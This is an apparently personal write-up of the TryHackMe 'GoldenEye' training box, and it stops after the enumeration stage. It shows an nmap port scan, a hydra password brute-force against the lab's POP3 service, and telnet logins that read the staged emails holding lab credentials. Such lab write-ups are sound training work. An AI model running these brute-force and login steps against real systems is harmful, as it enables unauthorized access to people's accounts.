---
title: "THM - # GoldenEye"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # GoldenEye"
categories:
  - THM
---

The given box ```GoldenEye``` is a Linux machine 

- [TryHackMe- GoldenEye](#tryhackme---GoldenEye)
  - [Recon](#recon)
	  - [Nmap Scan](#nmap-scan)
 - [Enumeration](#enumeration)
	 - [Enumeration on port 80](#enumeration-on-port-80)

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/goldeneye/assets/images/goldeneye.png" />
</center>
![[Pasted image 20220810195901.png]]

## Recon

### Nmap Scan

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/thm/LINUX/goldeneye]
└─# nmap -p- -sV -v 10.10.162.50
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 20:06 IST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 20:06
Scanning 10.10.162.50 [4 ports]
Completed Ping Scan at 20:06, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:06
Completed Parallel DNS resolution of 1 host. at 20:06, 0.02s elapsed
Initiating SYN Stealth Scan at 20:06
Scanning 10.10.162.50 [65535 ports]
Discovered open port 80/tcp on 10.10.162.50
Discovered open port 25/tcp on 10.10.162.50
SYN Stealth Scan Timing: About 5.98% done; ETC: 20:14 (0:08:07 remaining)
SYN Stealth Scan Timing: About 13.56% done; ETC: 20:16 (0:08:43 remaining)
Discovered open port 55007/tcp on 10.10.162.50
SYN Stealth Scan Timing: About 36.11% done; ETC: 20:16 (0:06:56 remaining)
SYN Stealth Scan Timing: About 42.19% done; ETC: 20:17 (0:06:20 remaining)
SYN Stealth Scan Timing: About 47.43% done; ETC: 20:17 (0:05:47 remaining)
SYN Stealth Scan Timing: About 54.99% done; ETC: 20:17 (0:05:05 remaining)
SYN Stealth Scan Timing: About 61.21% done; ETC: 20:17 (0:04:27 remaining)
SYN Stealth Scan Timing: About 66.52% done; ETC: 20:17 (0:03:52 remaining)
SYN Stealth Scan Timing: About 72.26% done; ETC: 20:17 (0:03:08 remaining)
Discovered open port 55006/tcp on 10.10.162.50
SYN Stealth Scan Timing: About 77.64% done; ETC: 20:17 (0:02:30 remaining)
SYN Stealth Scan Timing: About 83.25% done; ETC: 20:17 (0:01:51 remaining)
SYN Stealth Scan Timing: About 89.46% done; ETC: 20:16 (0:01:08 remaining)
SYN Stealth Scan Timing: About 94.87% done; ETC: 20:16 (0:00:33 remaining)
Completed SYN Stealth Scan at 20:16, 652.84s elapsed (65535 total ports)
Initiating Service scan at 20:16
Scanning 4 services on 10.10.162.50
Completed Service scan at 20:17, 27.99s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.162.50.
Initiating NSE at 20:17
Completed NSE at 20:17, 0.75s elapsed
Initiating NSE at 20:17
Completed NSE at 20:17, 0.68s elapsed
Nmap scan report for 10.10.162.50
Host is up (0.17s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 Dovecot pop3d
55007/tcp open  pop3     Dovecot pop3d

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 682.84 seconds
           Raw packets sent: 69433 (3.055MB) | Rcvd: 69136 (2.767MB)
```


## Enumeration

### Page source code

![[Pasted image 20220810201259.png]]

![[Pasted image 20220810201310.png]]

![[Pasted image 20220810201322.png]]

![[Pasted image 20220810202644.png]]

```&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;```

```Password:InvincibleHack3r```

### Password-Attack on found users

```shell
┌──(root㉿enum-more)-[~/…/goldeneye/results/10.10.162.50/scans]
└─# hydra -L usernames.txt -P fasttrack.txt pop3://10.10.162.50:55007    
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-10 20:31:18
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 888 login tries (l:4/p:222), ~56 tries per task
[DATA] attacking pop3://10.10.162.50:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 808 to do in 00:11h, 16 active
[55007][pop3] host: 10.10.162.50   login: Boris   password: secret1!
[STATUS] 85.00 tries/min, 255 tries in 00:03h, 633 to do in 00:08h, 16 active
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity.

[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.

[55007][pop3] host: 10.10.162.50   login: Natalya   password: bird
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.

[STATUS] 81.43 tries/min, 570 tries in 00:07h, 320 to do in 00:04h, 14 active
[55007][pop3] host: 10.10.162.50   login: boris   password: secret1!
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.

[55007][pop3] host: 10.10.162.50   login: natalya   password: bird
1 of 1 target successfully completed, 4 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-10 20:41:51
```

### Login to using the found credentials

```shell
┌──(root㉿enum-more)-[~/…/goldeneye/results/10.10.162.50/scans]
└─# telnet 10.10.162.50 55007  
Trying 10.10.162.50...
Connected to 10.10.162.50.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
LIST
+OK 3 messages:
1 544
2 373
3 921
.
retr 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
retr 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
retr 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.
exit
-ERR Unknown command: EXIT
quit
+OK Logging out.
```

```shell
┌──(root㉿enum-more)-[~/…/goldeneye/results/10.10.162.50/scans]
└─# telnet 10.10.162.50 55007                                                                                        
Trying 10.10.162.50...
Connected to 10.10.162.50.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user natalya
+OK
pass bird
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
.
retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

### Enumerate on severnaya-station.com

![[Pasted image 20220811194017.png]]

![[Pasted image 20220811194059.png]]

## Initial Foothold

## Privilege Escalation

## Conclusion